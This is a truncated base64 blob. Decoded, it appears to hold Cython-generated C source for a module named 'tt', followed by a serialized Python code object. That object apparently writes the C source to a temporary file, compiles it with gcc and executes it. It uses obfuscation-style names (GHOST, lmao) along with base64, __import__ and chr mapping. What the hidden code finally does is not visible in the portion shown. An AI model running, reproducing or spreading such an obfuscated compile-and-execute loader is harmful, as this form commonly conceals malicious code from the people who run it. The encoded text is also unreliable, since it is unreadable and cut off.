VU5VU0VEIHZvaWQqIGR1bW15KSB7XG4gICAgaW50NjRfdCBpbnRlcnByZXRlcl9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJRChfX1B5eF9QeUludGVycHJldGVyU3RhdGVfR2V0KCkpO1xuICAgIGlmIChpbnRlcnByZXRlcl9pZCA9PSAtMSkgcmV0dXJuIC0xO1xuICAgIGludCByZXN1bHQgPSAwO1xuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKTtcbiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRVxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqb2xkX2RhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICopXG4gICAgICAgICAgICBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSwgMCk7XG4jZWxzZVxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqb2xkX2RhdGEgPSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhO1xuI2VuZGlmXG4gICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICpuZXdfZGF0YSA9IG9sZF9kYXRhO1xuICAgIGlmICghbmV3X2RhdGEpIHtcbiAgICAgICAgbmV3X2RhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICopY2FsbG9jKDEsIHNpemVvZihfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEpKTtcbiAgICAgICAgaWYgKCFuZXdfZGF0YSkge1xuICAgICAgICAgICAgcmVzdWx0ID0gLTE7XG4gICAgICAgICAgICBQeUVycl9Ob01lbW9yeSgpO1xuICAgICAgICAgICAgZ290byBlbmQ7XG4gICAgICAgIH1cbiAgICAgICAgbmV3X2RhdGEtPmFsbG9jYXRlZCA9IDE7XG4gICAgICAgIG5ld19kYXRhLT5pbnRlcnByZXRlcl9pZF9hc19pbmRleCA9IDE7XG4gICAgfVxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3dhaXRfdW50aWxfbm9fcmVhZGVycygpO1xuICAgIGlmIChuZXdfZGF0YS0+aW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXgpIHtcbiAgICAgICAgaWYgKGludGVycHJldGVyX2lkIDwgX19QWVhfTU9EVUxFX1NUQVRFX0xPT0tVUF9TTUFMTF9TSVpFKSB7XG4gICAgICAgICAgICByZXN1bHQgPSBfX1B5eF9TdGF0ZV9BZGRNb2R1bGVJbnRlcnBJZEFzSW5kZXgoJm5ld19kYXRhLCBtb2R1bGUsIGludGVycHJldGVyX2lkKTtcbiAgICAgICAgICAgIGdvdG8gZW5kO1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X1N0YXRlX0NvbnZlcnRGcm9tSW50ZXJwSWRBc0luZGV4KG5ld19kYXRhKTtcbiAgICB9XG4gICAge1xuICAgICAgICBQeV9zc2l6ZV90IGluc2VydF9hdCA9IDA7XG4gICAgICAgIHtcbiAgICAgICAgICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGxvd2VyX2JvdW5kID0gX19QeXhfU3RhdGVfRmluZE1vZHVsZVN0YXRlTG9va3VwVGFibGVMb3dlckJvdW5kKFxuICAgICAgICAgICAgICAgIG5ld19kYXRhLT50YWJsZSwgbmV3X2RhdGEtPmNvdW50LCBpbnRlcnByZXRlcl9pZCk7XG4gICAgICAgICAgICBhc3NlcnQobG93ZXJfYm91bmQpO1xuICAgICAgICAgICAgaW5zZXJ0X2F0ID0gbG93ZXJfYm91bmQgLSBuZXdfZGF0YS0+dGFibGU7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoaW5zZXJ0X2F0IDwgbmV3X2RhdGEtPmNvdW50ICYmIGxvd2VyX2JvdW5kLT5pZCA9PSBpbnRlcnByZXRlcl9pZCkpIHtcbiAgICAgICAgICAgICAgICBsb3dlcl9ib3VuZC0+bW9kdWxlID0gbW9kdWxlO1xuICAgICAgICAgICAgICAgIGdvdG8gZW5kOyAgLy8gYWxyZWFkeSBpbiB0YWJsZSwgbm90aGluZyBtb3JlIHRvIGRvXG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgaWYgKG5ld19kYXRhLT5jb3VudCsxID49IG5ld19kYXRhLT5hbGxvY2F0ZWQpIHtcbiAgICAgICAgICAgIFB5X3NzaXplX3QgdG9fYWxsb2NhdGUgPSAobmV3X2RhdGEtPmNvdW50KzEpKjI7XG4gICAgICAgICAgICBuZXdfZGF0YSA9XG4gICAgICAgICAgICAgICAgKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSopcmVhbGxvYyhcbiAgICAgICAgICAgICAgICAgICAgbmV3X2RhdGEsXG4gICAgICAgICAgICAgICAgICAgIHNpemVvZihfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEpICtcbiAgICAgICAgICAgICAgICAgICAgKHRvX2FsbG9jYXRlLTEpKnNpemVvZihfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKSk7XG4gICAgICAgICAgICBpZiAoIW5ld19kYXRhKSB7XG4gICAgICAgICAgICAgICAgcmVzdWx0ID0gLTE7XG4gICAgICAgICAgICAgICAgbmV3X2RhdGEgPSBvbGRfZGF0YTtcbiAgICAgICAgICAgICAgICBQeUVycl9Ob01lbW9yeSgpO1xuICAgICAgICAgICAgICAgIGdvdG8gZW5kO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgbmV3X2RhdGEtPmFsbG9jYXRlZCA9IHRvX2FsbG9jYXRlO1xuICAgICAgICB9XG4gICAgICAgICsrbmV3X2RhdGEtPmNvdW50O1xuICAgICAgICBpbnQ2NF90IGxhc3RfaWQgPSBpbnRlcnByZXRlcl9pZDtcbiAgICAgICAgUHlPYmplY3QgKmxhc3RfbW9kdWxlID0gbW9kdWxlO1xuICAgICAgICBmb3IgKFB5X3NzaXplX3QgaT1pbnNlcnRfYXQ7IGk8bmV3X2RhdGEtPmNvdW50OyArK2kpIHtcbiAgICAgICAgICAgIGludDY0X3QgY3VycmVudF9pZCA9IG5ld19kYXRhLT50YWJsZVtpXS5pZDtcbiAgICAgICAgICAgIG5ld19kYXRhLT50YWJsZVtpXS5pZCA9IGxhc3RfaWQ7XG4gICAgICAgICAgICBsYXN0X2lkID0gY3VycmVudF9pZDtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpjdXJyZW50X21vZHVsZSA9IG5ld19kYXRhLT50YWJsZVtpXS5tb2R1bGU7XG4gICAgICAgICAgICBuZXdfZGF0YS0+dGFibGVbaV0ubW9kdWxlID0gbGFzdF9tb2R1bGU7XG4gICAgICAgICAgICBsYXN0X21vZHVsZSA9IGN1cnJlbnRfbW9kdWxlO1xuICAgICAgICB9XG4gICAgfVxuICBlbmQ6XG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkVcbiAgICBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSwgbmV3X2RhdGEpO1xuI2Vsc2VcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhID0gbmV3X2RhdGE7XG4jZW5kaWZcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIGludCBfX1B5eF9TdGF0ZV9SZW1vdmVNb2R1bGUoQ1lUSE9OX1VOVVNFRCB2b2lkKiBkdW1teSkge1xuICAgIGludDY0X3QgaW50ZXJwcmV0ZXJfaWQgPSBQeUludGVycHJldGVyU3RhdGVfR2V0SUQoX19QeXhfUHlJbnRlcnByZXRlclN0YXRlX0dldCgpKTtcbiAgICBpZiAoaW50ZXJwcmV0ZXJfaWQgPT0gLTEpIHJldHVybiAtMTtcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCk7XG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkVcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKmRhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICopXG4gICAgICAgICAgICBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSwgMCk7XG4jZWxzZVxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqZGF0YSA9IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGE7XG4jZW5kaWZcbiAgICBpZiAoZGF0YS0+aW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXgpIHtcbiAgICAgICAgaWYgKGludGVycHJldGVyX2lkIDwgZGF0YS0+Y291bnQpIHtcbiAgICAgICAgICAgIGRhdGEtPnRhYmxlW2ludGVycHJldGVyX2lkXS5tb2R1bGUgPSBOVUxMO1xuICAgICAgICB9XG4gICAgICAgIGdvdG8gZG9uZTtcbiAgICB9XG4gICAge1xuICAgICAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF93YWl0X3VudGlsX25vX3JlYWRlcnMoKTtcbiAgICAgICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSogbG93ZXJfYm91bmQgPSBfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlU3RhdGVMb29rdXBUYWJsZUxvd2VyQm91bmQoXG4gICAgICAgICAgICBkYXRhLT50YWJsZSwgZGF0YS0+Y291bnQsIGludGVycHJldGVyX2lkKTtcbiAgICAgICAgaWYgKCFsb3dlcl9ib3VuZCkgZ290byBkb25lO1xuICAgICAgICBpZiAobG93ZXJfYm91bmQtPmlkICE9IGludGVycHJldGVyX2lkKSBnb3RvIGRvbmU7XG4gICAgICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUgKmVuZCA9IGRhdGEtPnRhYmxlK2RhdGEtPmNvdW50O1xuICAgICAgICBmb3IgKDtsb3dlcl9ib3VuZDxlbmQtMTsgKytsb3dlcl9ib3VuZCkge1xuICAgICAgICAgICAgbG93ZXJfYm91bmQtPmlkID0gKGxvd2VyX2JvdW5kKzEpLT5pZDtcbiAgICAgICAgICAgIGxvd2VyX2JvdW5kLT5tb2R1bGUgPSAobG93ZXJfYm91bmQrMSktPm1vZHVsZTtcbiAgICAgICAgfVxuICAgIH1cbiAgICAtLWRhdGEtPmNvdW50O1xuICAgIGlmIChkYXRhLT5jb3VudCA9PSAwKSB7XG4gICAgICAgIGZyZWUoZGF0YSk7XG4gICAgICAgIGRhdGEgPSBOVUxMO1xuICAgIH1cbiAgZG9uZTpcbiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRVxuICAgIF9fcHl4X2F0b21pY19wb2ludGVyX2V4Y2hhbmdlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhLCBkYXRhKTtcbiNlbHNlXG4gICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSA9IGRhdGE7XG4jZW5kaWZcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKTtcbiAgICByZXR1cm4gMDtcbn1cbiNlbmRpZlxuXG5cbiNpZmRlZiBfTVNDX1ZFUlxuI3ByYWdtYSB3YXJuaW5nKCBwb3AgKVxuI2VuZGlmXG5cblxuXG5cbiNlbmRpZiBcblxuI2lmZGVmIF9fRnJlZUJTRF9fXG4jaW5jbHVkZSA8ZGVkZS5oPlxuI2VuZGlmXG4jaWYgUFlfTUFKT1JfVkVSU0lPTiA8IDNcbmludCBtYWluKGludCBhcmdjLCBjaGFyKiogYXJndikge1xuI2VsaWYgZGVmaW5lZChXaW4zMikgfHwgZGVmaW5lZChNU19XSU5ET1dTKVxuaW50IHdtYWluKGludCBhcmdjLCB3Y2hhcl90ICoqYXJndikge1xuI2Vsc2VcbnN0YXRpYyBpbnQgX19QeXhfbWFpbihpbnQgYXJnYywgd2NoYXJfdCAqKmFyZ3YpIHtcbiNlbmRpZlxuI2lmZGVmIF9fRnJlZUJTRF9fXG4gICAgZnBfZXhjZXB0X3QgbTtcbiAgICBtID0gZnBnZXRtYXNrKCk7XG4gICAgZnBzZXRtYXNrKG0gJiB+RlBfWF9PRkwpO1xuI2VuZGlmXG4gICAgaWYgKGFyZ2MgJiYgYXJndilcbiAgICAgICAgUHlfU2V0UHJvZ3JhbU5hbWUoYXJndlswXSk7XG4gICAgUHlfSW5pdGlhbGl6ZSgpO1xuICAgIGlmIChhcmdjICYmIGFyZ3YpXG4gICAgICAgIFB5U3lzX1NldEFyZ3YoYXJnYywgYXJndik7XG4gICAge1xuICAgICAgUHlPYmplY3QqIG0gPSBOVUxMO1xuICAgICAgX19weXhfbW9kdWxlX2lzX21haW5fdHQgPSAxO1xuICAgICAgI2lmIFBZX01BSk9SX1ZFUlNJT04gPCAzXG4gICAgICAgICAgaW5pdHR0KCk7XG4gICAgICAjZWxpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVRcbiAgICAgICAgICBtID0gUHlJbml0X3R0KCk7XG4gICAgICAgICAgaWYgKCFQeU1vZHVsZV9DaGVjayhtKSkge1xuICAgICAgICAgICAgICBQeU1vZHVsZURlZiAqbWRlZiA9IChQeU1vZHVsZURlZiAqKSBtO1xuICAgICAgICAgICAgICBQeU9iamVjdCAqbW9kbmFtZSA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nKCJfX21haW5fXyIpO1xuICAgICAgICAgICAgICBtID0gTlVMTDtcbiAgICAgICAgICAgICAgaWYgKG1vZG5hbWUpIHtcbiAgICAgICAgICAgICAgICAgIG0gPSBQeU1vZHVsZV9OZXdPYmplY3QobW9kbmFtZSk7XG4gICAgICAgICAgICAgICAgICBQeV9ERUNSRUYobW9kbmFtZSk7XG4gICAgICAgICAgICAgICAgICBpZiAobSkgUHlNb2R1bGVfRXhlY0RlZihtLCBtZGVmKTtcbiAgICAgICAgICAgICAgfVxuICAgICAgICAgIH1cbiAgICAgICNlbHNlXG4gICAgICAgICAgbSA9IFB5SW5pdF90dCgpO1xuICAgICAgI2VuZGlmXG4gICAgICBpZiAoUHlFcnJfT2NjdXJyZWQoKSkge1xuICAgICAgICAgIFB5RXJyX1ByaW50KCk7XG4gICAgICAgICAgI2lmIFBZX01BSk9SX1ZFUlNJT04gPCAzXG4gICAgICAgICAgaWYgKFB5X0ZsdXNoTGluZSgpKSBQeUVycl9DbGVhcigpO1xuICAgICAgICAgICNlbmRpZlxuICAgICAgICAgIHJldHVybiAxO1xuICAgICAgfVxuICAgICAgUHlfWERFQ1JFRihtKTtcbiAgICB9XG4jaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDYwMDAwXG4gICAgUHlfRmluYWxpemUoKTtcbiNlbHNlXG4gICAgaWYgKFB5X0ZpbmFsaXplRXgoKSA8IDApXG4gICAgICAgIHJldHVybiAyO1xuI2VuZGlmXG4gICAgcmV0dXJuIDA7XG59XG4jaWYgUFlfTUFKT1JfVkVSU0lPTiA+PSAzICYmICFkZWZpbmVkKFdpbjMyKSAmJiAhZGVmaW5lZChNU19XSU5ET1dTKVxuI2luY2x1ZGUgPGxvY2FsZS5oPlxuc3RhdGljIHdjaGFyX3QqXG5fX1B5eF9jaGFyMndjaGFyKGNoYXIqIGFyZylcbntcbiAgICB3Y2hhcl90ICpyZXM7XG4jaWZkZWYgSEFWRV9CUk9LRU5fTUJTVE9XQ1NcbiAgICBzaXplX3QgYXJnc2l6ZSA9IHN0cmxlbihhcmcpO1xuI2Vsc2VcbiAgICBzaXplX3QgYXJnc2l6ZSA9IG1ic3Rvd2NzKE5VTEwsIGFyZywgMCk7XG4jZW5kaWZcbiAgICBzaXplX3QgY291bnQ7XG4gICAgdW5zaWduZWQgY2hhciAqaW47XG4gICAgd2NoYXJfdCAqb3V0O1xuI2lmZGVmIEhBVkVfTUJSVE9XQ1xuICAgIG1ic3RhdGVfdCBtYnM7XG4jZW5kaWZcbiAgICBpZiAoYXJnc2l6ZSAhPSAoc2l6ZV90KS0xKSB7XG4gICAgICAgIHJlcyA9ICh3Y2hhcl90ICopbWFsbG9jKChhcmdzaXplKzEpKnNpemVvZih3Y2hhcl90KSk7XG4gICAgICAgIGlmICghcmVzKVxuICAgICAgICAgICAgZ290byBvb207XG4gICAgICAgIGNvdW50ID0gbWJzdG93Y3MocmVzLCBhcmcsIGFyZ3NpemUrMSk7XG4gICAgICAgIGlmIChjb3VudCAhPSAoc2l6ZV90KS0xKSB7XG4gICAgICAgICAgICB3Y2hhcl90ICp0bXA7XG4gICAgICAgICAgICBmb3IgKHRtcCA9IHJlczsgKnRtcCAhPSAwICYmXG4gICAgICAgICAgICAgICAgICAgICAoKnRtcCA8IDB4ZDgwMCB8fCAqdG1wID4gMHhkZmZmKTsgdG1wKyspXG4gICAgICAgICAgICAgICAgO1xuICAgICAgICAgICAgaWYgKCp0bXAgPT0gMClcbiAgICAgICAgICAgICAgICByZXR1cm4gcmVzO1xuICAgICAgICB9XG4gICAgICAgIGZyZWUocmVzKTtcbiAgICB9XG4jaWZkZWYgSEFWRV9NQlJUT1dDXG4gICAgYXJnc2l6ZSA9IHN0cmxlbihhcmcpICsgMTtcbiAgICByZXMgPSAod2NoYXJfdCAqKW1hbGxvYyhhcmdzaXplKnNpemVvZih3Y2hhcl90KSk7XG4gICAgaWYgKCFyZXMpIGdvdG8gb29tO1xuICAgIGluID0gKHVuc2lnbmVkIGNoYXIqKWFyZztcbiAgICBvdXQgPSByZXM7XG4gICAgbWVtc2V0KCZtYnMsIDAsIHNpemVvZiBtYnMpO1xuICAgIHdoaWxlIChhcmdzaXplKSB7XG4gICAgICAgIHNpemVfdCBjb252ZXJ0ZWQgPSBtYnJ0b3djKG91dCwgKGNoYXIqKWluLCBhcmdzaXplLCAmbWJzKTtcbiAgICAgICAgaWYgKGNvbnZlcnRlZCA9PSAwKVxuICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgIGlmIChjb252ZXJ0ZWQgPT0gKHNpemVfdCktMikge1xuICAgICAgICAgICAgZnByaW50ZihzdGRlcnIsICJ1bmV4cGVjdGVkIG1icnRvd2MgcmVzdWx0IC0yIik7XG4gICAgICAgICAgICBmcmVlKHJlcyk7XG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfVxuICAgICAgICBpZiAoY29udmVydGVkID09IChzaXplX3QpLTEpIHtcbiAgICAgICAgICAgICpvdXQrKyA9IDB4ZGMwMCArICppbisrO1xuICAgICAgICAgICAgYXJnc2l6ZS0tO1xuICAgICAgICAgICAgbWVtc2V0KCZtYnMsIDAsIHNpemVvZiBtYnMpO1xuICAgICAgICAgICAgY29udGludWU7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKCpvdXQgPj0gMHhkODAwICYmICpvdXQgPD0gMHhkZmZmKSB7XG4gICAgICAgICAgICBhcmdzaXplIC09IGNvbnZlcnRlZDtcbiAgICAgICAgICAgIHdoaWxlIChjb252ZXJ0ZWQtLSlcbiAgICAgICAgICAgICAgICAqb3V0KysgPSAweGRjMDAgKyAqaW4rKztcbiAgICAgICAgICAgIGNvbnRpbnVlO1xuICAgICAgICB9XG4gICAgICAgIGluICs9IGNvbnZlcnRlZDtcbiAgICAgICAgYXJnc2l6ZSAtPSBjb252ZXJ0ZWQ7XG4gICAgICAgIG91dCsrO1xuICAgIH1cbiNlbHNlXG4gICAgcmVzID0gKHdjaGFyX3QgKiltYWxsb2MoKHN0cmxlbihhcmcpKzEpKnNpemVvZih3Y2hhcl90KSk7XG4gICAgaWYgKCFyZXMpIGdvdG8gb29tO1xuICAgIGluID0gKHVuc2lnbmVkIGNoYXIqKWFyZztcbiAgICBvdXQgPSByZXM7XG4gICAgd2hpbGUoKmluKVxuICAgICAgICBpZigqaW4gPCAxMjgpXG4gICAgICAgICAgICAqb3V0KysgPSAqaW4rKztcbiAgICAgICAgZWxzZVxuICAgICAgICAgICAgKm91dCsrID0gMHhkYzAwICsgKmluKys7XG4gICAgKm91dCA9IDA7XG4jZW5kaWZcbiAgICByZXR1cm4gcmVzO1xub29tOlxuICAgIGZwcmludGYoc3RkZXJyLCAib3V0IG9mIG1lbW9yeSIpO1xuICAgIHJldHVybiBOVUxMO1xufVxuaW50XG5tYWluKGludCBhcmdjLCBjaGFyICoqYXJndilcbntcbiAgICBpZiAoIWFyZ2MpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X21haW4oMCwgTlVMTCk7XG4gICAgfVxuICAgIGVsc2Uge1xuICAgICAgICBpbnQgaSwgcmVzO1xuICAgICAgICB3Y2hhcl90ICoqYXJndl9jb3B5ID0gKHdjaGFyX3QgKiopbWFsbG9jKHNpemVvZih3Y2hhcl90KikqYXJnYyk7XG4gICAgICAgIHdjaGFyX3QgKiphcmd2X2NvcHkyID0gKHdjaGFyX3QgKiopbWFsbG9jKHNpemVvZih3Y2hhcl90KikqYXJnYyk7XG4gICAgICAgIGNoYXIgKm9sZGxvYyA9IHN0cmR1cChzZXRsb2NhbGUoTENfQUxMLCBOVUxMKSk7XG4gICAgICAgIGlmICghYXJndl9jb3B5IHx8ICFhcmd2X2NvcHkyIHx8ICFvbGRsb2MpIHtcbiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAib3V0IG9mIG1lbW9yeSIpO1xuICAgICAgICAgICAgZnJlZShhcmd2X2NvcHkpO1xuICAgICAgICAgICAgZnJlZShhcmd2X2NvcHkyKTtcbiAgICAgICAgICAgIGZyZWUob2xkbG9jKTtcbiAgICAgICAgICAgIHJldHVybiAxO1xuICAgICAgICB9XG4gICAgICAgIHJlcyA9IDA7XG4gICAgICAgIHNldGxvY2FsZShMQ19BTEwsICIiKTtcbiAgICAgICAgZm9yIChpID0gMDsgaSA8IGFyZ2M7IGkrKykge1xuICAgICAgICAgICAgYXJndl9jb3B5MltpXSA9IGFyZ3ZfY29weVtpXSA9IF9fUHl4X2NoYXIyd2NoYXIoYXJndltpXSk7XG4gICAgICAgICAgICBpZiAoIWFyZ3ZfY29weVtpXSkgcmVzID0gMTtcbiAgICAgICAgfVxuICAgICAgICBzZXRsb2NhbGUoTENfQUxMLCBvbGRsb2MpO1xuICAgICAgICBmcmVlKG9sZGxvYyk7XG4gICAgICAgIGlmIChyZXMgPT0gMClcbiAgICAgICAgICAgIHJlcyA9IF9fUHl4X21haW4oYXJnYywgYXJndl9jb3B5KTtcbiAgICAgICAgZm9yIChpID0gMDsgaSA8IGFyZ2M7IGkrKykge1xuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA1MDAwMFxuICAgICAgICAgICAgZnJlZShhcmd2X2NvcHkyW2ldKTtcbiNlbHNlXG4gICAgICAgICAgICBQeU1lbV9SYXdGcmVlKGFyZ3ZfY29weTJbaV0pO1xuI2VuZGlmXG4gICAgICAgIH1cbiAgICAgICAgZnJlZShhcmd2X2NvcHkpO1xuICAgICAgICBmcmVlKGFyZ3ZfY29weTIpO1xuICAgICAgICByZXR1cm4gcmVzO1xuICAgIH1cbn1cbiNlbmRpZlxuelx4MDR0dC5jXHhkYVx4MDEuXHhkYVx4MDEgXHhlOVx4ZmZceGZmXHhmZlx4ZmZ6XHgwNmdjYyAtSXpceDBmL2luY2x1ZGUvcHl0aG9uelx4MDQgLW8gelx4MDMgLUx6XHIvbGliIC1scHl0aG9uXHhkYVx4MDF3XHhkYVx4MDJvc1QpXHgwMVx4ZGFceDA4ZXhpc3Rfb2spMVx4ZGFceDAzbWFwXHhkYVx4MDNjaHJceGRhXHgwMUdceGRhXHgwMUhceGRhXHgwMU9ceGRhXHgwMVNceGRhXHgwMVRceGRhXHgwMUpceGRhXHgwMUlceGRhXHgwMkdIXHhkYVx4MDJPU1x4ZGFceDAyVEpceGRhXHgwMklJXHhkYVx4MDVHSE9TVFx4ZGFceDA4dGVtcGZpbGVceGRhXHgwMXRyXHgxNFx4MDBceDAwXHgwMHJcblx4MDBceDAwXHgwMFx4ZGFcbmdob3N0X3BhdGhyXHgwYlx4MDBceDAwXHgwMFx4ZGFceDA1Z3JkbXZyXHgwY1x4MDBceDAwXHgwMFx4ZGFceDA0c3RlbVx4ZGFceDA2YmFzZTY0clxyXHgwMFx4MDBceDAwXHhkYVx4MDRsbWFvXHhkYVx4MDVwcmludFx4ZGFcbl9faW1wb3J0X19ceGRhXHgwNnByZWZpeFx4ZGFceDA2UFJFRklYXHhkYVx4MGNFWEVDVVRFX0ZJTEVceGRhXHgxMUVYUE9SVF9QWVRIT05IT01FXHhkYVxuZXhlY3V0YWJsZVx4ZGFceDE4RVhQT1JUX1BZVEhPTl9FWEVDVVRBQkxFXHhkYVx4MDNSVU5ceGRhXHgwNmlzZmlsZVx4ZGFceDA0ZXhpdFx4ZGFceDA4Q19TT1VSQ0VceGRhXHgwNkNfRklMRVx4ZGFceDA0am9pblx4ZGFceDA3dmVyc2lvblx4ZGFceDA1c3BsaXRceGRhXHgwZVBZVEhPTl9WRVJTSU9OXHhkYVx4MGNDT01QSUxFX0ZJTEVceGRhXHgwNG9wZW5ceGRhXHgwMWZceGRhXHgwNXdyaXRlXHhkYVx4MDhtYWtlZGlyc1x4ZGFceDA3ZGlybmFtZVx4YTlceDAwXHhmM1x4MDBceDAwXHgwMFx4MDBceGRhXHgwNWdob3N0XHhkYVx4MDg8bW9kdWxlPnJFXHgwMFx4MDBceDAwXHgwMVx4MDBceDAwXHgwMHMuXHgwMlx4MDBceDAwXHhmMFx4MDNceDAxXHgwMVx4MDFceGQ5XHgxMlx4MTVceDkwY1x4ZDJceDFiO1x4ZDNceDEyPFx4ODFceDBmXHg4MFx4MDFceDgwIVx4ODBBXHg4MGFceDg4XHgwMVx4ODghXHg4OEFceDg4YVx4ZDhceDExXHgxMlx4OTAxXHg5MVx4MTNceDkwYVx4OThceDAxXHg5MWNceDk4MVx4OThRXHg5OTNceGEwXHgwMVx4YTAhXHhhMVx4MDNceGQwXHgxMSNceDgxXHgwZVx4ODBceDAyXHg4MEJceDg4XHgwMlx4ODhCXHhkOFx4MDhcdFx4ODghXHg4OVx4MDNceDg4QVx4ODlceDA1XHg4OGFceDg5XHgwN1x4OTBceDAxXHg4OVx0XHg5MCFceDg5XHgwYlx4OTBBXHg4OVxyXHg5MGFceDg5XHgwZlx4ODBceDA1XHhkYlx4MDBceDE0XHhkZlx4MDBCXHhkMVx4MDBCXHhkZFx4MDAkXHhlMVx4MDBceDA1XHhkMFx4MDYpXHhkNFx4MDAqXHhkOVx4MDBceDA1XHg4MGJceDg0XHRceGQ5XHgwMFx4MDVceGQwXHgwNkVceGQ0XHgwMEZceGQ5XHgwMFx4MDVceDgwYlx4ODRcdFx4ZDlceDA3XHgxMVx4OTAlXHhkM1x4MDdceDE4XHhkN1x4MDdceDFmXHhkMVx4MDdceDFmXHg4MFx4MDZceGQ4XHgwZlx4MWFceDgwXHgwY1x4ZDhceDEzXCdceGE5XG5ceGIwNVx4ZDMoOVx4ZDcoQFx4ZDEoQFx4ZDFceDEzQFx4ZDBceDAwXHgxMVx4ZDhceDFhNVx4YjF6XHhjMCVceGQzN0hceGQ3N1NceGQxN1NceGQxXHgxYVNceGQwXHgwMFx4MThceGQ4XHgwNlxuXHg4OExceGQxXHgwNlx4MThceDgwXHgwM1x4ZDhceDAzXHJceGQ3XHgwM1x4MTRceGQyXHgwM1x4MTRceDkwXFxceGQ3XHgwMyJceGQxXHgwMyJceGQ5XHgwNFx4MDhceGQwXHRceDFhXHg5OERceGQxXHQgXHhkMCI6XHhkMVx0Olx4YjhEXHhkMVx0QFx4YzAjXHhkMVx0RVx4ZDRceDA0Rlx4ZDlceDA0XHgwOFx4ODhceDExXHg4NEdceGYwXHgwMmFgXHgwNVx4MGNceDA0XHg4MFx4MDhceGYwREFceDBiXHgwMFx0XHgwZlx4ODBceDA2XHhkOFx4MTFceDE0XHg5N1x4MThceDkxXHgxOFx4OTkqXHhhMFVceGQzXHgxYStceGQ3XHgxYTNceGQxXHgxYTNceGQ3XHgxYTlceGQxXHgxYTlceGI4I1x4ZDNceDFhPlx4YjhxXHhkMVx4MWFBXHhkN1x4MWFHXHhkMVx4MWFHXHhjOFx4MDNceGQzXHgxYUxceGM4U1x4YzhiXHhkMFx4MWFRXHhkM1x4MTFSXHg4MFx4MGVceGQ4XHgxMFx4MThceDk4Nlx4ZDFceDEwIVx4ZDAkNVx4ZDFceDEwNVx4YjhceDBlXHhkMVx4MTBGXHhjOFx4MTZceGQxXHgxME9ceGQwUl5ceGQxXHgxMF5ceGQwYWRceGQxXHgxMGRceGQwZ21ceGQxXHgxMG1ceGQwcHVceGQxXHgxMHVceGQweH5ceGQxXHgxMH5ceGYwXHgwMFx4MDBCXHgwMlFceDAyXHhmMVx4MDBceDAwXHgxMVFceDAyXHhmMFx4MDBceDAwVFx4MDJiXHgwMlx4ZjFceDAwXHgwMFx4MTFiXHgwMlx4ODBceDBjXHhkOVx4MDVcdFx4ODgmXHg5MFx4MTNceGQ0XHgwNVx4MTVceDk4XHgxMVx4ZDhceDA0XHgwNVx4ODdHXHg4MUdceDg4SFx4ZDRceDA0XHgxNVx4ZjdceDAzXHgwMFx4MDZceDE2XHhlMVx4MDBcblx4ODg0XHhkM1x4MDBceDEwXHhkN1x4MDBceDE5XHhkM